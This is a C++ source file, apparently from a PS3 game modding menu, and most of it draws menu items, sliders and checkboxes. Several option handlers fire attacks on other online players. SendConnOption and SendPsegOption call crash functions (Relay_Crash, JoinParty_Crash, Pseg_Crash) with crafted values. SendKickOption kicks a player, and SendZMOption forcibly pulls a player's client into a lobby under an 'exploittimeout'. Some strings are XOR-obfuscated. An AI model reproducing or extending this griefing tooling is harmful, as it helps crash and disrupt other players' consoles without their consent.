		if (active)DrawText(menudescription, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addCOption(const char* title, const char* des, void(*func)()) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		func(), Wait(200);

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		if (active)DrawText(des, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void SendConnOption(const char* title, const char* des, int id) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
		Relay_Crash(id, 1234567890);
		JoinParty_Crash(id, 1234567890);
		Relay_Crash(id, -1234567890);
		JoinParty_Crash(id, -1234567890);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void SendPsegOption(const char* title, const char* des, int id) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
		Pseg_Crash(id, 1234567890);
		Pseg_Crash(id, -1234567890);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void SendKickOption(const char* title, const char* des, int id) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
		send_client_kick(id);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void SendZMOption(const char* title, const char* des, int id) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
		Wait(200);
		if (messages.size() != 1 && pullcooldown == 0) {
			PartyMember pM = GetPartyMemeber(id);

			if (strlen(pM.npid.handle) <= 0) return;

			auto Lookup = doLookupNpId(pM.npid.handle);

			if (Lookup.first.reserved[0] == 0) {
				char buf[100];
				Com_Sprintf(buf, sizeof(buf), encryptDecrypt(hash("$r!endr!onu!dyhru")).c_str(), pM.npid.handle);
				UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^bnous`bu^dyqhsde")).c_str(), buf, VirtualXOR(hash("XMK@HU"), 3).c_str(), 5000);
				goto End;
			}

			if (Lookup.second == 0) {
				if (messages.size() != 1) {
					UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^q`sux^d`rd^hbno")).c_str(), encryptDecrypt(hash("Rdoehof")).c_str(), pM.npid.handle, 5000);
					pull_client_to_lobby(Lookup.first, 0, 900, menu->exploittimeout * 1000);
				}
				goto End;
			}
		End:
			pullcooldown = menu->exploittimeout;
		}
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

template<typename... T>
void addInfOption(const char* title, const char* des, void (*Function)(T...), T... args) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		Function(args...), Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddFriendOption(const char* title, const char* des, const char* name, const char* npid, bool swi = true) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		friends::write_friend(name, npid), Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddDelFriendOption(const char* title, const char* des, const char* name) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		friends::delete_friend(name), Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddConfigOption(const char* title, const char* des, void(*func)()) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		func(), Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addCamoOption(const char* title, const char* Camo) {
	if (active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				SND_Play(hash("cac_grid_equip_item"), 1, 1);
				loadcamo(Camo);
				Wait(150);
			}
		}
	} else {
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addChemCamoOption(const char* title, const char* Camo, int address, size_t size) {
	if (active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				SND_Play(hash("cac_grid_equip_item"), 1, 1);

				Wait(150);
			}
		}
	} else {
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addBarI(String title, int Min, int Max, int& value, int scale, const char(*menudescription)) {
	float incrementValue = 100 * ((float)value - (float)Min) / ((float)Max - (float)Min);

	if (value < Min)
		value = Min;
	if (value > Max)
		value = Max;

	char MenuBuff[100];
	Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s scale %i"), menudescription, value);
	if (active) {
		if (ready) {
			if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {

				SND_Play(hash("cac_safearea"), 1, 1);
				value += (PadDown(PAD_RIGHT) && value < Max) ? scale : 0;
				value -= (PadDown(PAD_LEFT) && value > Min) ? scale : 0;
				if (PadDown(PAD_L1)) {
					Wait(5);
				} else {
					Wait(30);
				}
			}
		}
	}

	else {
		SLLR = false;
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 100, 3, 180, color(90, 90, 90, 255), white, align_right); //bar ( full length )
		DrawShader(menu->x + (menu->msize / 2) - 110, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), (incrementValue), 3, 180, menu->skin, white, align_left); //bar ( full length )
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawShader(menu->x + (menu->msize / 2) - 110 + (incrementValue - 1), 266 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 2, 10, 180, color(255, 255, 255, 255), white, align_left);// slider bar
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addBar(String title, float Min, float Max, float& value, float scale, const char(*menudescription)) {
	float incrementValue = 100 * (value - Min) / (Max - Min);

	if (value < Min)
		value = Min;
	if (value > Max)
		value = Max;

	char MenuBuff[56];
	Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s scale %.2f"), menudescription, value);
	if (active) {
		if (ready) {
			if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {

				SND_Play(hash("cac_safearea"), 1, 1);
				value += (PadDown(PAD_RIGHT) && value < Max) ? scale : 0;
				value -= (PadDown(PAD_LEFT) && value > Min) ? scale : 0;

				if (PadDown(PAD_L1)) {
					Wait(5);
				} else {
					Wait(30);
				}
			}
		}
	}

	else {
		SLLR = false;
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) - (menu->scrollbarsize / 2), 100, 3 + menu->scrollbarsize, 180, color(90, 90, 90, 255), white, align_right); //bar ( full length )
		DrawShader(menu->x + (menu->msize / 2) - 110, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) - (menu->scrollbarsize / 2), (incrementValue), 3 + menu->scrollbarsize, 180, menu->skin, white, align_left); //bar ( full length )
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawShader(menu->x + (menu->msize / 2) - 110 + (incrementValue - 1), 266 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) - (menu->scrollbarsize / 2), 2, 10 + menu->scrollbarsize, 180, color(255, 255, 255, 255), white, align_left);// slider bar
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addColorEBar(String title, float Min, float Max, const const char(*menudescription), float& value, float scale, bool bSLLR) {
	float incrementValue = 100 * (value - Min) / (Max - Min);

	if (value < Min)
		value = Min;
	if (value > Max)
		value = Max;

	char MenuBuff[50];
	Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s scale %.2f"), menudescription, value);
	if (active) {
		if (ready) {
			if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {

				SND_Play(hash("cac_safearea"), 1, 1);
				value += (PadDown(PAD_RIGHT) && value < Max) ? scale : 0;
				value -= (PadDown(PAD_LEFT) && value > Min) ? scale : 0;

				if (PadDown(PAD_L1)) {
					Wait(1);
				} else {
					Wait(30);
				}

			}
		}
	}

	else {
		SLLR = false;
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 100, 3, 180, color(90, 90, 90, 255), white, align_right); //bar ( full length )
		DrawShader(menu->x + (menu->msize / 2) - 110, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), (incrementValue), 3, 180, menu->skin, white, align_left); //bar ( full length )
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawShader(menu->x + (menu->msize / 2) - 110 + (incrementValue - 1), 266 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 2, 10, 180, color(255, 255, 255, 255), white, align_left);// slider bar
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addColorBar(String title, float Min, float Max, const char(*menudescription), float& value, float scale, bool bSLLR) {
	float incrementValue = 100 * (value - Min) / (Max - Min);

	if (value < Min)
		value = Min;
	if (value > Max)
		value = Max;

	char MenuBuff[50];
	Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s scale %.2f"), menudescription, value);
	if (active) {
		if (ready) {
			if (!menu->fade) {
				if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {

					SND_Play(hash("cac_safearea"), 1, 1);
					value += (PadDown(PAD_RIGHT) && value < Max) ? scale : 0;
					value -= (PadDown(PAD_LEFT) && value > Min) ? scale : 0;

					if (PadDown(PAD_L1)) {
						Wait(1);
					} else {
						Wait(30);
					}

				}
			}
		}
	}

	else {
		SLLR = false;
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 100, 3, 180, color(90, 90, 90, 255), white, align_right); //bar ( full length )
		DrawShader(menu->x + (menu->msize / 2) - 110, 270 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), (incrementValue), 3, 180, menu->skin, white, align_left); //bar ( full length )
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawShader(menu->x + (menu->msize / 2) - 110 + (incrementValue - 1), 266 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 2, 10, 180, color(255, 255, 255, 255), white, align_left);// slider bar
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}


void addInt1(String title, int Min, int Max, int step, int& value, const char(*menudescription)) {
	if (value <= Min)
		value = Min;
	if (value >= Max)
		value = Max;

	if (active) {
		if (ready) {
			if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {
				SND_Play(hash("cac_safearea"), 1, 1),
					value += (PadDown(PAD_RIGHT) && value < Max) ? step : 0;
				value -= (PadDown(PAD_LEFT) && value > Min) ? step : 0;
				if (PadDown(PAD_L1)) {
					Wait(5);
				} else {
					Wait(60);
				}
			}
		}
	}

	else {
		//nothing
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char psz_value[10];
		_sys_sprintf(psz_value, "%i", value);
		if (active)DrawText(menudescription, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);

		DrawText(psz_value, Vector2(menu->x + (menu->msize / 2) - 10, 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addInt(String title, int Min, int Max, int step, void(*func_setbarvalue)(int value), const char(*menudescription), bool bSLLR) {
	if (Mshit.barslide[Mshit.id][Mshit.maxscroll[Mshit.id]] <= Min)
		Mshit.barslide[Mshit.id][Mshit.maxscroll[Mshit.id]] = Min;
	if (Mshit.barslide[Mshit.id][Mshit.maxscroll[Mshit.id]] >= Max)
		Mshit.barslide[Mshit.id][Mshit.maxscroll[Mshit.id]] = Max;

	if (active) {
		SLLR = bSLLR;
		if (ready) {
			if (PadDown(PAD_RIGHT) || PadDown(PAD_LEFT)) {
				SND_Play(hash("cac_safearea"), 1, 1),
					Mshit.barslide[Mshit.id][Mshit.scroll[Mshit.id]] += (PadDown(PAD_RIGHT)) ? (int)step : 0;
				Mshit.barslide[Mshit.id][Mshit.scroll[Mshit.id]] -= (PadDown(PAD_LEFT)) ? (int)step : 0;
				func_setbarvalue(Mshit.barslide[Mshit.id][Mshit.scroll[Mshit.id]] - 1);
				if (PadDown(PAD_L1)) {
					Wait(5);
				} else {
					Wait(60);
				}
			}
		}
	}

	else {
		SLLR = false;
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {

		char psz_value[10];
		_sys_sprintf(psz_value, hash("%i"), Mshit.barslide[Mshit.id][Mshit.maxscroll[Mshit.id]]);
		if (active)DrawText(menudescription, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);

		DrawText(psz_value, Vector2(menu->x + (menu->msize / 2) - 10, 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addFPS(String title, float fps) {
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[10];
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%.f"), fps);
		DrawText(MenuBuff, Vector2(menu->x + (menu->msize / 2) - 10, 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

colorbyte Rainbow(int progression, colorbyte startColor, colorbyte endColor) {
	colorbyte color;
	color.r = round(startColor.r + (endColor.r - startColor.r) * progression * 0.01);
	color.g = round(startColor.g + (endColor.g - startColor.g) * progression * 0.01);
	color.b = round(startColor.b + (endColor.b - startColor.b) * progression * 0.01);
	return color;
}

void DrawOutlineCheck(float x, float y, float width, float height, color colorr, int thickness, alignment ali) {
	//Draw border
	DrawShader(x, y + thickness, width + thickness, thickness, 0, colorr, white, ali); // Top<
	DrawShader(x, y + height + thickness, width + thickness, thickness, 0, colorr, white, ali); // Bottom>

	DrawShader(x - width - thickness, y + thickness, thickness, height + thickness, 0, colorr, white, ali); //Right <
	DrawShader(x, y + thickness, thickness, height + thickness, 0, colorr, white, ali); //Left <
}

void addCheck2(String title, bool& check, const const char(*menudescription)) {

	color checkmark;

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
			SND_Play(hash("cac_grid_equip_item"), 1, 1),
			check = !check, noshit(), Wait(200);
		DrawOutlineCheck(menu->x + (menu->msize / 2) - 11, 259 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 14, 20, color(255, 255, 255, 255), 1, align_right);//outline

		if (check) {

			checkmark = menu->skin;

			checkmark.a = menu->skin.a / 2.4;
		}

		DrawShader(menu->x + (menu->msize / 2) - 12, 262 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 10, 16, 0, check ? checkmark : color(0, 0, 0, 0), white, align_right);
		DrawOutlineCheck(menu->x + (menu->msize / 2) - 12, 260 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 10, 18, check ? color(0, 0, 0, 255) : color(0, 0, 0, 0), 1, align_right);//outline
		DrawOutlineCheck(menu->x + (menu->msize / 2) - 13, 261 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 10, 16, check ? menu->skin : color(0, 0, 0, 0), 1, align_right);//outline
		if (active)DrawText(menudescription, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
